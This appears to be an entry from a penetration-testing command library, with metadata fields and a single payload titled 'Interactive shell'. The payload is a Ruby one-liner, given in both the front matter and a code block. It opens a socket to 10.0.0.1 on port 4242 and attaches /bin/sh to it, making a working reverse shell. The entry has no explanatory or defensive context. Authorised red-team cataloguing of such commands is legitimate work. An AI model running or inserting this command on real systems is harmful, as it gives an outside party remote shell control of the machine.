---
id: c0d654c2-d7ed-42f0-9415-30da9f8c763a
name: Interactive shell
type: command
executor: bash
data: ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh
  -i <&%d >&%d 2>&%d",f,f,f)'
output: null
created_at: '2023-04-06T03:56:24.309517+00:00'
updated_at: '2023-04-10T20:25:24.555565+00:00'
---

# Interactive shell

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


